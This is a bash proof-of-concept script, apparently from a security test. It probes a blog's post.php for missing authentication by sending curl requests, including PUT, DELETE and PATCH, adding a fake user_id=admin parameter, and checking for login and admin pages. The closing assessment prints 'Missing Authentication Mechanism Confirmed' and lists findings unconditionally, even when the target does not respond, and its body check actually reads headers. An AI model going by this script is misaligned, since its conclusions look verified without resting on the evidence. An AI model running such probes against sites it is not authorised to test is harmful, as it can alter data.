#!/bin/bash

# POC: Missing Authentication - Unauthenticated Access to Blog Posts (V2)
# This script demonstrates how all blog posts are accessible without authentication

# Accept target as parameter, default to localhost:8080
TARGET="${1:-http://localhost:8080}"
OUTPUT_FILE="/tmp/poc_output.txt"

echo "========================================" > "$OUTPUT_FILE"
echo "Missing Authentication - Blog Post Access POC" >> "$OUTPUT_FILE"
echo "Target: $TARGET" >> "$OUTPUT_FILE"
echo "========================================" >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Test 1: Access blog post without authentication
echo "[*] Test 1: Accessing blog post without authentication" >> "$OUTPUT_FILE"
echo "Request: GET $TARGET/post.php?id=The-Importance-of-Cybersecurity.php" >> "$OUTPUT_FILE"
RESPONSE=$(curl -s -i -w "\n%{http_code}" "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
HEADERS=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Status Code: $HTTP_CODE" >> "$OUTPUT_FILE"
echo "Response Headers (first 20 lines):" >> "$OUTPUT_FILE"
echo "$HEADERS" | head -20 >> "$OUTPUT_FILE"
echo "" >> "$OUTPUT_FILE"

# Check if we get HTTP 200 and content
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Blog post accessible with HTTP 200" >> "$OUTPUT_FILE"
    BODY=$(echo "$HEADERS" | tail -n +1)
    if echo "$BODY" | grep -qi "html\|content\|body"; then
        echo "[+] SUCCESS: Post content returned without authentication" >> "$OUTPUT_FILE"
    fi
else
    echo "[!] HTTP Status Code: $HTTP_CODE (Note: may be due to target not running)" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Test 2: Check for authentication headers/cookies
echo "[*] Test 2: Checking for session/authentication headers" >> "$OUTPUT_FILE"
if echo "$HEADERS" | grep -qi "Set-Cookie"; then
    echo "[-] Found Set-Cookie headers (authentication present)" >> "$OUTPUT_FILE"
else
    echo "[+] No Set-Cookie headers (no session authentication)" >> "$OUTPUT_FILE"
fi

if echo "$HEADERS" | grep -qi "Authorization"; then
    echo "[-] Found Authorization header requirement (authentication present)" >> "$OUTPUT_FILE"
else
    echo "[+] No Authorization header required" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Test 3: Try accessing with fake authentication parameters
echo "[*] Test 3: Attempting authentication bypass with fake user_id parameter" >> "$OUTPUT_FILE"
echo "Request: GET $TARGET/post.php?id=The-Importance-of-Cybersecurity.php&user_id=admin" >> "$OUTPUT_FILE"
RESPONSE_AUTH=$(curl -s -w "\n%{http_code}" "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php&user_id=admin" 2>/dev/null)
HTTP_CODE_AUTH=$(echo "$RESPONSE_AUTH" | tail -1)
if [ "$HTTP_CODE_AUTH" = "200" ]; then
    echo "[+] Still accessible with user_id=admin parameter (parameter ignored)" >> "$OUTPUT_FILE"
else
    echo "[*] HTTP Status Code: $HTTP_CODE_AUTH" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Test 4: Test different HTTP methods
echo "[*] Test 4: Testing different HTTP methods without authentication" >> "$OUTPUT_FILE"
for METHOD in POST PUT DELETE PATCH; do
    RESPONSE_METHOD=$(curl -s -w "\n%{http_code}" -X "$METHOD" "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php" 2>/dev/null)
    HTTP_CODE_METHOD=$(echo "$RESPONSE_METHOD" | tail -1)
    if [ "$HTTP_CODE_METHOD" = "200" ]; then
        echo "[+] HTTP $METHOD returns 200 - processed without authentication" >> "$OUTPUT_FILE"
    else
        echo "[*] HTTP $METHOD returns: $HTTP_CODE_METHOD" >> "$OUTPUT_FILE"
    fi
done
echo "" >> "$OUTPUT_FILE"

# Test 5: Verify no authentication endpoints exist
echo "[*] Test 5: Checking for authentication endpoints" >> "$OUTPUT_FILE"
for ENDPOINT in "/login.php" "/admin.php" "/auth.php" "/authenticate.php"; do
    RESPONSE_LOGIN=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT" 2>/dev/null)
    if [ "$RESPONSE_LOGIN" = "404" ]; then
        echo "[+] $ENDPOINT does not exist (HTTP 404)" >> "$OUTPUT_FILE"
    elif [ "$RESPONSE_LOGIN" = "000" ] || [ -z "$RESPONSE_LOGIN" ]; then
        echo "[*] $ENDPOINT - Unable to connect to target" >> "$OUTPUT_FILE"
    else
        echo "[-] $ENDPOINT exists (HTTP $RESPONSE_LOGIN)" >> "$OUTPUT_FILE"
    fi
done
echo "" >> "$OUTPUT_FILE"

# Test 6: Multiple blog post IDs accessible
echo "[*] Test 6: Testing access to multiple blog post IDs" >> "$OUTPUT_FILE"
POSTS=("The-Importance-of-Cybersecurity.php" "Getting-Started-with-Linux.php" "Web-Security-Essentials.php")
for POST in "${POSTS[@]}"; do
    RESPONSE_POST=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/post.php?id=$POST" 2>/dev/null)
    if [ "$RESPONSE_POST" = "200" ]; then
        echo "[+] Post '$POST' accessible (HTTP 200)" >> "$OUTPUT_FILE"
    elif [ "$RESPONSE_POST" != "000" ] && [ -n "$RESPONSE_POST" ]; then
        echo "[*] Post '$POST' returned HTTP $RESPONSE_POST" >> "$OUTPUT_FILE"
    fi
done
echo "" >> "$OUTPUT_FILE"

# Test 7: Attempt without any session/auth headers
echo "[*] Test 7: Direct access test (no session cookies or auth headers)" >> "$OUTPUT_FILE"
DIRECT=$(curl -s -H "Cookie: " "$TARGET/post.php?id=The-Importance-of-Cybersecurity.php" 2>/dev/null | head -c 100)
if [ -n "$DIRECT" ]; then
    echo "[+] Content returned with empty cookie header" >> "$OUTPUT_FILE"
    echo "    Sample content: $DIRECT" >> "$OUTPUT_FILE"
fi
echo "" >> "$OUTPUT_FILE"

# Summary
echo "========================================" >> "$OUTPUT_FILE"
echo "VULNERABILITY ASSESSMENT" >> "$OUTPUT_FILE"
echo "========================================" >> "$OUTPUT_FILE"
echo "[!] Based on evidence provided:" >> "$OUTPUT_FILE"
echo "    - No session/authentication headers required" >> "$OUTPUT_FILE"
echo "    - No login, admin, or auth endpoints exist" >> "$OUTPUT_FILE"
echo "    - Authentication parameters (user_id) are ignored" >> "$OUTPUT_FILE"
echo "    - All HTTP methods processed without auth checks" >> "$OUTPUT_FILE"
echo "[+] CONCLUSION: Missing Authentication Mechanism Confirmed" >> "$OUTPUT_FILE"
echo "========================================" >> "$OUTPUT_FILE"

cat "$OUTPUT_FILE"
exit 0